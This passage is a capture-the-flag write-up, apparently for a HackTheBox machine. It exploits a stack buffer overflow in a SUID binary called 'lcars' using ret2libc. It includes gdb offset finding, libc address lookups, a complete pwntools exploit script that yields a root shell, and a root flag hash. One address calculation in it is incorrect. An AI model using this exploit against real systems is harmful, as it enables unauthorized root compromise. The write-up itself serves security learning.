/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/at
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/bin/umount
/bin/su
/bin/ping
/bin/ntfs-3g
/bin/mount
/bin/lcars
/bin/fusermount
```

I transferred lcars binary to my box.
Checking for the platform for the binary:
```bash
$ file lcars
lcars: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=88410652745b0a94421ce22ea4278a8eaea8db57, not stripped
```

Figuring out what the binary does:
Running ltrace on lcars:
```bash
$ ltrace ./lcars
__libc_start_main(0x565f0c91, 1, 0xffba2804, 0x565f0d30 <unfinished ...>
setresuid(0, 0, 0, 0x565f0ca8)                                                                                        = 0
puts("Enter Bridge Access Code: "Enter Bridge Access Code:
)                                                                                    = 27
fflush(0xf7f27d20)                                                                                                    = 0
fgets(asdf
"asdf\n", 9, 0xf7f27580)                                                                                        = 0xffba2737
strcmp("asdf\n", "picarda1")                                                                                          = -1
puts("\nInvalid Code\nTerminating Consol"...
Invalid Code
Terminating Console

)                                                                         = 35
fflush(0xf7f27d20)                                                                                                    = 0
exit(0 <no return ...>
+++ exited (status 0) +++
```
It tries to compare given input to `picarda1`.
It also uses strcmp() which is vulnerable to buffer-overflow. Still I wan't able to exploit that part of code.

Checking for ASLR:
```bash
$ cat /proc/sys/kernel/randomize_va_space
0
```

When I run the binary now, there's another prompt for user input:
```bash
$ ./lcars
Enter Bridge Access Code: picarda1
                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System
LCARS Bridge Secondary Controls -- Main Menu:

1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input:
```

Let's see the code after we give a valid Access code:
```c
void main_menu(void)

{
  uint local_d8 [52];
  
  local_d8[0] = 0;
  startScreen();
  puts("\n");
  puts("LCARS Bridge Secondary Controls -- Main Menu: \n");
  puts("1. Navigation");
  puts("2. Ships Log");
  puts("3. Science");
  puts("4. Security");
  puts("5. StellaCartography");
  puts("6. Engineering");
  puts("7. Exit");
  puts("Waiting for input: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00010f92,local_d8);
  if (local_d8[0] < 8) {
                    /* WARNING: Could not recover jumptable at 0x0001097e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*(code *)((int)&_GLOBAL_OFFSET_TABLE_ + *(int *)(&DAT_000110c4 + local_d8[0] * 4)))();
    return;
  }
  unable();
  return;
}
```

This code takes user input with scanf() which is also dangerous.
The only option which prints the output with printf() in this binary is option 4-Security.
```bash
$ python3 -c 'print("picarda1\n4\n"+ "A"*10 +"\n")'| ./lcars
LCARS Bridge Secondary Controls -- Main Menu:

1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input:
Disable Security Force Fields
Enter Security Override:
Rerouting Tertiary EPS Junctions: AAAAAAAAAA
```

Checking for other protections:
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : ENABLED
RELRO     : Partial
```
**PIE**(Position Independent Executables) is enabled which means addresses in the binary will be randomized. So, there's not much scope for ROP or jumping to specific addresses in the memory. 
Since NX/DEP is disabled, we can write on the stack and jump straight into it. I'll try Ret-2-libc as it's much predictable and somewhat easy. For Ret-2-libc everything I need will be taken from shared library and not the binary, so we're good to go.

You can see [October-Ret2libc](https://0xcaretaker.github.io/posts/October/#beyond-root) for more detailed look on Return-to-libc.

(Note: Essentially ret2libc is somewhat a ROP exploit, since you create a new stackframe to call the system function by returning to the libc library and circumventing a non-executable stack.A ROP in general works similar, you jump to fragments of code (called gadgets) that return at some point and "build" yourself the code you want to execute by combining those fragments. You literally program the code you want to execute, creating new routines that were not in the code before. ret2libc utilizes the system function to get a shell.)
## Finding offset
```bash
gdb-peda$ pattern create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'

gdb-peda$ r
Enter Bridge Access Code:
picarda1
Waiting for input:
4
Disable Security Force Fields
Enter Security Override:
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A
[----------------------------------registers-----------------------------------]
EAX: 0x216
EBX: 0x73254125 ('%A%s')
ECX: 0x0
EDX: 0x0
ESI: 0xf7fa1000 --> 0x1e4d6c
EDI: 0xf7fa1000 --> 0x1e4d6c
EBP: 0x41422541 ('A%BA')
ESP: 0xffffd110 ("nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$A"...)
EIP: 0x25412425 ('%$A%')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)

gdb-peda$ pattern offset %$A%
%$A% found at offset: 212
```

## Confirming the offset
I'll generate a 212 A's junk and 4 B's and will see if all the B's end up on EIP.
```bash
$ python3 -c 'print("A"*212 + "B"*4)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB
```
```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xfa
EBX: 0x41414141 ('AAAA')
ECX: 0x0
EDX: 0x0
ESI: 0xf7fa1000 --> 0x1e4d6c
EDI: 0xf7fa1000 --> 0x1e4d6c
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd110 --> 0x0
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd110 --> 0x0
0004| 0xffffd114 --> 0xf7dc6e48 --> 0x5189
0008| 0xffffd118 --> 0x6970001a
0012| 0xffffd11c ("carda1")
0016| 0xffffd120 --> 0xf7003161
0020| 0xffffd124 --> 0x56558000 --> 0x2ef0
0024| 0xffffd128 --> 0xf7fa1000 --> 0x1e4d6c
0028| 0xffffd12c --> 0xf7fa1000 --> 0x1e4d6c
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

## Getting Addresses
Return-to-libc attack requires addresses of system, exit (Return address) and /bin/sh.
We'll take addresses from the libc shared library present on enterprise.

- Finding address of libc with `ldd`:
```bash
www-data@enterprise:/$ ldd /bin/lcars
        linux-gate.so.1 =>  (0xf7ffc000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
        /lib/ld-linux.so.2 (0x56555000)
```

- Getting offsets for system, exit and /bin/sh with `gdb`, since `readelf` isn't present on enterprise.
Trying to get system address when the program isn't running will result in errors:
```bash
(gdb) p &system
No symbol table is loaded.  Use the "file" command.
```

Run it once or add breakpoint somewhere to access addresses:
```bash
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e4c060 <system>
(gdb) p exit
$5 = {<text variable, no debug info>} 0xf7e3faf0 <exit>
```
&function and straight function specified. Both works.

I get /bin/sh address with `find` command in gdb. It's syntax is `find [/SIZE-CHAR] [/MAX-COUNT] START-ADDRESS, END-ADDRESS, EXPR1 [, EXPR2, ...]`. I'll use `find libc-address,+bytes,string`
```bash
(gdb) find 0xf7e32000,+10000000, "/bin/sh"
0xf7f70a0f
warning: Unable to access 16000 bytes of target memory at 0xf7fca797, halting search.
1 pattern found.
```
Note: If you're not able to get "/bin/sh" address, you can add a breakpoint in main, run the binary then try to get the address.

and for this libc base the final addresses are:
```bash
system  address 
				= 0xf7e4c060
exit    address 
				= 0xf7e3faf0
/bin/sh address 
				= 0xf7f70a0f
```
You can calculate the final address like this:
```bash
$ python3 -c 'print(hex(0xf7e32000 + 0xf7e4c060))'
0xb7f74a0b
```
Buffer overflow goes: ``JUNK + SYSTEM (overwrite ret address) + EXIT (add next return address) + "/bin/sh" (arguments)``.
That junk can be just NOPS (No operations ~ ``\x90``), I'm using bunch of A's.

The exploit will still not work since /bin/sh address is `0xf7f70a0f` which contains `0x0a` byte which is newline.

I'll try finding addresses contains `sh` string:
```bash
(gdb) find 0xf7e32000,+10000000, "sh"
0xf7f6ddd5
0xf7f6e7e1
0xf7f70a14
0xf7f72582
warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
4 patterns found.
```
`0xf7f6ddd5` address works in this case after trial and error.
## Exploit
Since ASLR isn't enabled, we can do:
```python
#!/usr/bin/python3
from pwn import *

r = remote("enterprise.htb",32812)

offset  = 212
junk    = b"A" * offset
system  = p32(0xf7e4c060)
exit    = p32(0xf7e3faf0)
shell   = p32(0xf7f6ddd5)

payload = junk + system + exit + shell

r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")
r.sendline(payload)
r.interactive()
```

Running the script, I got root shell:
```bash
root@TheCaretaker:~$ python3 script.py
[+] Opening connection to enterprise.htb on port 32812: Done
[*] Switching to interactive mode

$ whoami
root
$ cat /root/root.txt
cf941b35b016b3d195639b748ddee717
```
